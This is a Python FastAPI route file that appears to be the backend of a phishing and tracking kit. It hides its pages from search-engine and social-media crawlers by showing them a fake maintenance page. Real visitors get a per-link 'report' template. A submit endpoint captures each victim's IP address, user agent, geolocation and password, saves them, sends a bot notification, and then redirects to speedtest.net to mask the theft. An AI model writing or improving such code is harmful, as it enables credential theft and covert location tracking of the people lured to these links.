from fastapi import APIRouter, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse
from fastapi.templating import Jinja2Templates
import user_agents
from database import save_scan_data, Scan, get_db
from bot import send_notification
import os

app = APIRouter()
templates = Jinja2Templates(directory="templates")

def is_bot(ua_string):
    bots = ['Googlebot', 'Bingbot', 'facebookexternalhit', 'Twitterbot']
    ua = user_agents.parse(ua_string)
    return ua.is_bot or any(b in ua_string for b in bots)

@app.get("/report/{unique_id}")
async def report(request: Request, unique_id: str):
    ua = request.headers.get("user-agent", "")
    if is_bot(ua):
        with open("templates/maintenance.html") as f:
            return HTMLResponse(f.read())
    
    db = next(get_db())
    scan = db.query(Scan).filter(Scan.unique_id == unique_id).first()
    db.close()
    
    if not scan:
        return HTMLResponse("404 - Link Expired", status_code=404)
    
    try:
        with open(f"templates/{scan.template}.html") as f:
            content = f.read().replace("{{UNIQUE_ID}}", unique_id)
        return HTMLResponse(content)
    except:
        return HTMLResponse("Template Error", status_code=500)

@app.post("/submit")
async def submit(
    unique_id: str = Form(...),
    ip: str = Form(...),
    user_agent: str = Form(...),
    geolocation: str = Form(...),
    password: str = Form(...)
):
    data = {'ip': ip, 'user_agent': user_agent, 'geolocation': geolocation, 'password': password}
    saved = save_scan_data(unique_id, data)
    
    if saved:
        db = next(get_db())
        scan = db.query(Scan).filter(Scan.unique_id == unique_id).first()
        await send_notification(scan)
        db.close()
    
    return RedirectResponse(url="https://www.speedtest.net")
